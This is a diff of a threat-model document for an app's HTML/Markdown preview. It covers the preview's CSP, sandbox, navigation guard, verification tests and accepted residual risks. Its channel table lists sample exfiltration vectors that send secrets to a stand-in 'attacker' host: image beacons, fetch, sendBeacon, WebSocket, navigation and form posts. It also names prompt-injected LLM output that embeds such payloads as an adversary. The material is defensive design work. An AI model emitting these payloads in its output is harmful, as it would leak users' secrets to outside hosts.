@@ -1,22 +1,29 @@
 # HTML Preview — Threat Model
 
-**Scope:** the Writ preview surface (ADR-009, lean re-scope; supersedes the
-trust apparatus of ADR-010/011).
-**Status:** current as of the L3 verification suite.
+**Scope:** the Writ preview surface (ADR-009 lean re-scope; ADR-011 amended by
+[ADR-043](../adr/043-untrusted-documents-in-the-preview.md)).
+**Status:** current as of U9.
 
 ## What the preview is for
 
-The preview renders **Writ's own offline agent/LLM output and prompt
-results**, for readability. It is explicitly **not** a safe renderer for
-hostile web pages, and it is not a browser. The single design fact that
-everything below rests on:
+The preview renders Markdown, HTML, Mermaid and KaTeX. Since ADR-041 file
+associations route any downloaded `.md` or `.html` into it, so a document in the
+preview may be **untrusted**, not only Writ's own agent output. It is still not
+a browser. Two design facts everything below rests on:
 
-> **Network egress is categorically off, forever.**
+> **A document that is not opted in sends nothing out through any channel below.**
+>
+> **A document's own scripts are off until the user opts the file in.**
 
-That one constraint dissolves the conventional HTML-preview trust problem.
-There is no per-document trust, no pin store, no audit log, no per-buffer
-scripts/network toggle — those were designed (ADR-011) for a renderer that
-*could* reach the network and were cut when network was cut.
+The document CSP shuts the fetch-shaped channels. The iframe sandbox, the app's
+`frame-src` and the navigation guard shut navigation. Two kinds of markup are
+disarmed before the document is served: the resource hints no CSP directive
+governs, and the attributes that start a frame navigation without a script,
+whose target Chromium connects to before the policy refuses it. With scripts
+off nothing is left to open the channels a script could (ADR-043). There is no pin
+store and no audit log: those were designed (ADR-011) for a renderer that could
+reach the network. There is a per-file scripts opt-in, kept on the buffer row,
+because a downloaded document is not the user's own.
 
 ## Assets
 
@@ -27,6 +34,9 @@ scripts/network toggle — those were designed (ADR-011) for a renderer that
 
 ## Adversary
 
+- **A downloaded document.** File associations route any `.md` or `.html`
+  into the preview (ADR-041), so a file built to report that it was opened,
+  or to carry out the text of a note it embeds, is shown like any other.
 - **Prompt-injected or malicious agent output.** The user previews text an
   LLM produced; that text may have been steered by a prompt-injection
   attack to embed an exfiltration payload (`<img src=https://attacker/?…>`,
@@ -38,58 +48,93 @@ scripts/network toggle — those were designed (ADR-011) for a renderer that
 
 ## Exfiltration channels and how each is closed
 
-The boundary is the **fixed document Content-Security-Policy**, attached as
-a response header by the `writ-preview://` protocol handler to every
-document response. The locked bytes (scripts-on form):
+The boundary has six parts: the **document Content-Security-Policy** attached
+as a response header to every document response; the **iframe sandbox**; the
+app's **`frame-src`**; the **main-webview navigation guard**; and the
+**resource-hint rewrite** and the **frame rewrite** the handler applies to
+every document it serves. The locked document policy on macOS and Linux,
+scripts-on form:
 
 ```
 default-src 'none';
 script-src 'unsafe-inline' 'self' writ-preview:;
 style-src 'unsafe-inline' 'self' writ-preview:;
-img-src data: writ-preview:;
-font-src data: writ-preview:;
-media-src data: writ-preview:;
+img-src 'self' writ-preview: data:;
+font-src 'self' writ-preview: data:;
+media-src 'self' writ-preview: data:;
 connect-src 'none'; object-src 'none'; frame-src 'none';
 worker-src 'none'; form-action 'none'; base-uri 'none';
-frame-ancestors 'self'; navigate-to 'none';
+frame-ancestors tauri://localhost http://localhost:1420;
+navigate-to 'none';
+sandbox allow-scripts allow-same-origin
 ```
+
+On Windows each subresource directive also lists `http://writ-preview.document`,
+the document's own origin under WebView2's custom-scheme form, and
+`frame-ancestors` names the app as `http://tauri.localhost` and
+`https://tauri.localhost`. The scripts-off form drops `'unsafe-inline'` from
+`script-src`. The preview iframe carries `sandbox="allow-scripts
+allow-same-origin"`. The app's `frame-src` is `writ-preview:` on macOS and
+Linux and `http://writ-preview.chrome http://writ-preview.document` on Windows
+(`tauri.windows.conf.json`).
 
 | Channel | Vector | Closed by |
 |---|---|---|
-| Image beacon | `<img src="https://attacker/?secret">` | `img-src data: writ-preview:` — no remote scheme |
+| Image beacon | `<img src="https://attacker/?secret">` | `img-src` has no remote scheme |
 | Scripted fetch | `fetch('https://attacker/', {body: secret})` | `connect-src 'none'` |
 | Beacon API | `navigator.sendBeacon('https://attacker/', secret)` | `connect-src 'none'` |
 | WebSocket | `new WebSocket('wss://attacker/')` | `connect-src 'none'` |
-| Remote font | `@font-face { src: url('https://attacker/?…') }` | `font-src data: writ-preview:` |
-| Remote stylesheet | `@import url('https://attacker/?…')` | `style-src` has no remote scheme |
-| Navigation exfil | `<meta http-equiv=refresh>`, `window.location` | `navigate-to 'none'`, `base-uri 'none'` |
-| Form post | `<form action="https://attacker/">` | `form-action 'none'` |
+| Remote font | `@font-face { src: url('https://attacker/?…') }` | `font-src` has no remote scheme |
+| Remote stylesheet | `@import url(…)`, `<link rel=stylesheet href=…>` | `style-src` has no remote scheme |
+| Resource hint | `<link rel=preconnect\|dns-prefetch\|prefetch\|preload\|prerender href=…>`, also as a second `rel` after a stylesheet's | the hint rewrite, which renames the link's tag whichever `rel` an engine reads, and `X-DNS-Prefetch-Control: off`; no CSP directive governs `preconnect` |
+| Top navigation | `top.location = 'https://attacker/?secret'` | iframe sandbox (no `allow-top-navigation`) and the navigation guard |
+| Frame navigation | `<meta http-equiv=refresh>`, `location.href` | the frame rewrite renames every `http-equiv` but five inert pragmas before the document is served; the app's `frame-src` (only the preview origins) and, on macOS and Linux, the guard refuse a script's navigation, which on WebView2 connects to its target first (an opted-in file only, see the residual risks) |
+| Link click | `<a>`, `<area>` or an SVG link, any `target` | the bridge reports it to the app as a request to open and cancels it; the sandbox and `frame-src` behind it |
+| Popup | `window.open(…)`, `target=_blank` | iframe sandbox (no `allow-popups`) |
+| Form post | `<form action="https://attacker/">` | iframe sandbox (no `allow-forms`) and `form-action 'none'` |
 | Plugin / embed | `<object>`, `<embed>` | `object-src 'none'` |
-| Nested frame | `<iframe src=…>` | `frame-src 'none'` |
+| Nested frame | `<iframe src=…>`, `<iframe srcdoc=…>`, `<frame src=…>` | the frame rewrite renames every `src` and `srcdoc` on an `iframe` or `frame` before the document is served, since Chromium connects to a refused frame's target and both engines build a `srcdoc` document under `frame-src 'none'`; `frame-src 'none'` refuses a frame a script creates, which on WebView2 connects first (an opted-in file only) |
+| `<base>` redirect | `<base href="https://attacker/">` | `base-uri 'none'` |
 
-`http:` is no more permitted than `https:` — neither scheme appears in any
-directive. `data:` and `writ-preview:` are the only non-keyword sources, and
-neither can reach the network: `data:` is inline, and `writ-preview:` is the
-host's own protocol, served only the bundled chrome assets and the current
-buffer's rendered HTML (see the scope boundary below).
+`navigate-to` is not the control for navigation: no shipping engine implements
+it, so it is kept only as defense in depth.
 
-### Why scripts can be on
+`http:` to a remote host is no more permitted than `https:`; neither appears in
+any egress directive. The only non-keyword sources are `data:`, which is
+inline, the preview scheme, and on Windows the document's own WebView2 origin.
+The preview scheme in both forms is the host's own protocol, which serves only
+the bundled chrome assets, the current buffer's rendered HTML, and through the
+`_note-asset/` route the images a note embeds, from the folders its render
+recorded (see the scope boundary below).
 
-Scripts default **on** so interactive agent output works — sliders,
-checkboxes, and (from L5/L6) Mermaid and KaTeX. A prompt-injected script
-*runs*, but it has no egress: `connect-src 'none'` blocks `fetch`/XHR/
-`WebSocket`/`sendBeacon`, and the resource directives admit no remote
-scheme, so it cannot construct an exfiltrating subresource either. The
-app-level `preview.run_scripts` kill switch flips `script-src` to `'none'`
-for users who want belt-and-suspenders; it does not change the network
-posture, which is off either way.
+### Scripts are off by default
+
+A document's own scripts are off until the user turns them on for that file
+("Preview: Toggle scripts for this file", or the `Scripts off` field the
+status bar shows while an HTML or Markdown document is in the preview), kept
+on the buffer row with the digest of the bytes the file held (ADR-043). A save
+from Writ records the digest of what it wrote. Every render and every read by
+the status bar compares the recorded digest with the one of the bytes Writ last
+read from the file or wrote to it, without reading the file, so a change
+another program makes turns the scripts off again before the new bytes run a
+script, whether the tab was open or closed or Writ was not running, and a
+preview showing the file reloads. When
+off, `script-src` admits only `'self'` and the preview scheme, so the
+document's own inline and authored scripts do not run; the first-party
+runtimes (the bridge, Mermaid, KaTeX, served same-origin under `_assets/`)
+still load, so diagrams and math draw in every note. When a file is opted in,
+`script-src` gains `'unsafe-inline'` and the document's scripts run. The CSP,
+the sandbox, `frame-src` and the guard still apply, but a script has channels
+none of them govern (see the residual risks): an opted-in file is one whose
+code the user trusts.
 
 ## The `writ-preview://` scope boundary
 
-The protocol has two scopes: `chrome` (host-owned bundled assets) and
-`document` (the user's rendered buffer). The chrome scope runs `'self'`
-scripts (it will host the Mermaid/KaTeX runtimes); the document scope must
-never be able to reach into it. The parser
+The protocol has two scopes: `chrome` (host-owned bundled assets: the fallback
+stylesheet and the parked blank document) and `document` (the user's rendered
+buffer, plus the first-party runtimes served same-origin under its `_assets/`
+route). The document scope must never be able to reach the chrome scope. The
+parser
 (`writ_core::preview::protocol::parse`) refuses any request that, after a
 single percent-decode and backslash-normalisation, contains a `..` segment
 — so `writ-preview://document/../chrome/x` and its encoded and Windows-slash
@@ -99,60 +144,144 @@ it directly.
 
 ## Verification
 
-The boundary is proven in-repo, on every PR (the merge gates), plus a
-nightly fuzz job:
+The boundary is proven in-repo. The unit suites below run in the required CI
+checks on every PR that changes code. The engine probe runs there too, as its
+own job; it is not a required check until all three of its legs have passed.
+The URL parser's fuzz target runs locally with `cargo fuzz` on a nightly
+toolchain; no CI job runs it, and the property test below holds its
+invariants as a merge gate.
 
-- **Exfil denial — CSP semantics.** `src-tauri/tests/preview_security.rs`
-  evaluates the locked document CSP against each of the six exfil vectors
-  with an independent CSP evaluator (`preview::csp_eval`) and asserts
-  `Deny`. The evaluator is validated against *independent oracle policies*
-  (e.g. `img-src https:` allows https, `img-src 'none'` denies it,
-  `img-src 'self'` denies cross-origin) so it implements real CSP semantics
-  rather than merely agreeing with our policy string — a deny-everything
-  stub fails the allow-class assertions. **Why CSP semantics and not the
-  recorder:** a remote exfil request never reaches the protocol handler
-  (the webview blocks it at CSP-enforcement time), so the disposition
-  recorder structurally cannot witness it. The boundary against exfil *is*
-  the CSP; the test proves the CSP bytes deny each vector.
-- **Scope/traversal — disposition recorder.** The same suite drives URLs
+- **A real engine enforcing it: the exfil probe.**
+  `src-tauri/tests/engine_probe.rs` builds the shipped topology in a real
+  WebKit, WebKit2GTK or WebView2 window: an app-origin page under the app CSP
+  the build merges for the platform, framing the preview document with the
+  shipped sandbox attribute at the URL the host's base gives, the document
+  rendered by the HTML renderer and served through the production handler and
+  guard. Every vector aims at its own local TCP sink, STUN at a UDP sink, and
+  host names at a DNS sink where the run routes a test domain to it.
+  - Scripts off: every static vector in the table above, plus an inline script.
+    Asserted: no sink sees anything, the inline script does not run, the bridge
+    does, and the app page stays.
+  - Scripts on: the document's script tries every navigation and fetch in the
+    table. Asserted: none reaches a sink, each link click reaches the app as a
+    request to open, and the app page stays. STUN and a preconnect the script
+    creates are reported, not asserted, and on Windows so are the frame
+    navigations the script starts.
+  - Controls: the same iframe, at the same origin and under the same sandbox,
+    loads a document served without the policy that fires an image, a
+    preconnect and STUN at fresh sinks, and, with the DNS sink on, an image by
+    name. The image must land and the name must reach the DNS sink, or silence
+    would prove nothing. A page with no policy at `about:blank` fires the same
+    set as a diagnostic. On Windows the probe turns off Chromium's private and
+    local network checks, which would otherwise stop a loopback sink for a
+    reason no remote host meets.
+
+  It runs as the `engine-probe` CI job on macOS, Windows and Linux. It needs a
+  display and the main thread, so it runs under `WRIT_ENGINE_PROBE=1` and is a
+  no-op in the ordinary unit gate.
+- **The policy bytes.** `src-tauri/src/preview/csp.rs` locks the document and
+  chrome policies for each platform byte for byte, and
+  `src-tauri/tests/app_csp_tests.rs` the app's `frame-src` on each platform and
+  that the Windows policy differs from the base in nothing else.
+- **The hint rewrite.** `crates/writ-core/tests/preview_resource_hints_tests.rs`
+  checks the rewritten output with html5ever's tokenizer started at every `<`,
+  counting a link live when its `rel` names a hint or it repeats an attribute
+  (Chromium's preload scanner acts on a later `rel`), across the parser
+  contexts that change how a `<` reads and a generated set of attribute
+  spellings, and checks with a tree builder that a renamed link leaves the rest
+  of the document's tree as it was; `src-tauri/tests/preview_security.rs`
+  checks that the links the renderers write pass through it unchanged.
+- **The frame rewrite.** `crates/writ-core/tests/preview_frame_navigation_tests.rs`
+  checks the rewritten output with the same tokenizer, counting a frame live
+  while an `iframe` or `frame` keeps a `src` or `srcdoc` and a pragma live
+  while a `meta` keeps an `http-equiv` that is not one of the five inert
+  pragmas, across the same parser contexts and a generated set of attribute
+  spellings; it checks that every copy of a repeated attribute is renamed,
+  that the five inert pragmas are kept, that overlapping tags are read in
+  linear time, and with a tree builder that only the renamed attribute names
+  change. An end tag named `src`, `srcdoc` or `http-equiv` that a tag left open
+  in text reads as an attribute keeps its name, and that attribute has no value;
+  one with an `=` after its name is renamed.
+  `preview_security.rs` checks that the renderers' documents pass through it
+  unchanged.
+- **Scope/traversal: the disposition recorder.** The same suite drives URLs
   through the real `resolve()` pipeline and asserts the recorded
-  disposition: document→chrome traversal (plain, encoded, double-encoded,
+  disposition: document-to-chrome traversal (plain, encoded, double-encoded,
   backslash), null bytes, and bad encodings are `Refused`; legitimate
   same-scope requests are `Allowed`.
+- **The navigation guard.** `src-tauri/src/navigation.rs` tests that the guard
+  allows the app origin, the preview scheme and inert `about:` pages, allows
+  the WebView2 forms on Windows only, allows the dev server's exact origin
+  only under `tauri dev`, and refuses every remote origin, `data:`,
+  `javascript:` and lookalike host; `src-tauri/tests/preview_scripts_ipc_tests.rs`
+  that it is installed on the app.
+- **The scripts opt-in.** `crates/writ-storage/tests/buffer_store_tests.rs`
+  checks that an opt-in lapses when Writ reads bytes another program wrote
+  while the tab was closed or while Writ was not running, that a save from
+  Writ keeps it and cannot carry it over another program's change, that a CRLF
+  file is covered by the bytes the save wrote, and that a check with none of
+  the file's bytes in hand runs nothing;
+  `src-tauri/tests/preview_scripts_external_change_tests.rs` drives the same
+  cases through the app's watcher, close, History reopen, the editor's read and
+  render, and checks that a move keeps the opt-in and a chat apply to an open
+  tab takes it; `src-tauri/tests/note_history_ipc_tests.rs` that a restored
+  version takes it; `src-tauri/tests/preview_scripts_stall_tests.rs` that a
+  render and a status-bar read of an opted-in tab on a file whose reads never
+  return wait on nothing, and a save of another tab does not wait behind them.
+- **No event-bus subscriber takes the buffer store.** The bus runs its
+  subscribers on the emitting thread, and a reopen emits with the store held.
+  `src-tauri/tests/event_bus_store_lock_tests.rs` hangs the app's own
+  subscribers on a state, holds the store and emits one of every event, each of
+  which returns; pins `src-tauri/src/bus_subscribers.rs` as the one place the
+  app subscribes; and reopens a tab whose file another program changed, and
+  asks for Today's note on a changed file, both of which answer and turn the
+  file's scripts off.
 - **Parser fuzzing.** `fuzz/fuzz_targets/preview_url_parser.rs` fuzzes
   `parse` for "never panics" and "no traversal survives into an accepted
   request." A stable-toolchain property test
   (`crates/writ-core/tests/preview_url_parser_property.rs`) enforces the
   same invariants over the committed seed corpus and a generated adversarial
-  bank, so the guarantee is a green merge gate, not only a nightly job.
-  Latest local run: 10.6M executions, 0 crashes.
+  bank, so the guarantee is a green merge gate, not only a local fuzz run.
 
-## Residual risks — explicitly accepted
+## Residual risks, explicitly accepted
 
-The verification proves *our* code denies these channels. It rests on one
-assumption we do not (and cannot, in-repo) verify:
-
-- **We trust the webview engine to enforce the attached CSP per spec.** The
-  CSP is a response header; WebKit (macOS), WebKit2GTK (Linux), and WebView2
-  (Windows) enforce it. A CSP-enforcement bypass — a 0-day in the engine
-  that lets a document fetch a remote resource the policy forbids — would
-  defeat the boundary. This is **out of scope**; the mitigation is OS
-  sandboxing and timely Tauri/engine upgrades. This is the honest location
-  of "behavioral" verification: cross-platform, real-engine confirmation
-  that the attached CSP is enforced as written is the job of the
-  release-PR CI matrix (which runs the full suite on all three engines),
-  not of the in-repo unit gates.
-- **A user who pastes secrets into a buffer and runs an injected script that
-  manipulates the visible DOM** can mislead the user visually (it cannot
-  exfiltrate). Phishing-by-rendered-content is not defended against beyond
-  the network boundary; the user is previewing their own content.
+- **An opted-in file can reach the network.** Neither the CSP nor the sandbox
+  governs `RTCPeerConnection` STUN, a resource hint a script inserts after the
+  document is served, or a link click a script hides from the bridge (WebKit
+  connects to a `target=_blank` link's host even when the sandbox refuses the
+  popup). On WebView2 a frame navigation the script starts (a frame it
+  creates, a refresh it inserts, `location.href`) connects to its target
+  before `frame-src` refuses it, which reaches no host an inserted hint cannot.
+  Opting a file in is a decision to run its code.
+- **First-party runtimes as gadgets.** With scripts off any document can still
+  load the bridge, Mermaid and KaTeX through `script-src 'self'`. Mermaid runs
+  in strict mode and KaTeX with `trust` off; neither opens a channel the policy
+  leaves shut.
+- **A person's own click.** The probe's clicks are scripted; a mouse run on
+  each platform is a manual check.
+- **The opt-in follows the file through Writ's own saves.** A file edited and
+  saved in Writ keeps its opt-in, whatever the edit put in it.
+- **A change Writ has not read.** The opt-in is checked against the bytes Writ
+  last read from the file or wrote to it. While a change no watcher reported
+  sits on disk under a tab still showing the text from before it, the preview
+  runs the scripts of that text; the opt-in lapses when Writ reads the change.
+- **We trust the webview engine to enforce the attached policy per spec.** A
+  CSP- or sandbox-enforcement bypass, a 0-day in WebKit (macOS), WebKit2GTK
+  (Linux) or WebView2 (Windows), would defeat the boundary. This is out of
+  scope; the mitigation is OS sandboxing and timely engine upgrades. The
+  three-engine probe is the standing check that the policy is enforced as
+  written.
+- **A script that manipulates the visible DOM** (in an opted-in document) can
+  mislead the user visually. Phishing-by-rendered-content is not defended
+  against beyond the network boundary.
 - **Local-filesystem attackers** (an actor with the user's privileges) are
   out of scope, as above.
 
 ## Change control
 
-The locked CSP bytes are asserted by byte-equality tests
-(`src-tauri/src/preview/csp.rs`). Any change to them is a deliberate
-security decision and will fail those tests until updated — that failure is
-the gate that forces the decision to be conscious. The exfil suite then
-re-proves denial against the new bytes.
+The locked policy bytes are asserted by byte-equality tests
+(`src-tauri/src/preview/csp.rs`) and the app's `frame-src` by
+`src-tauri/tests/app_csp_tests.rs`. Any change to them is a deliberate security
+decision and fails those tests until updated; that failure is the gate that
+makes the decision a conscious one. The engine probe then shows, on every PR
+that changes code, that the engines enforce the new bytes.
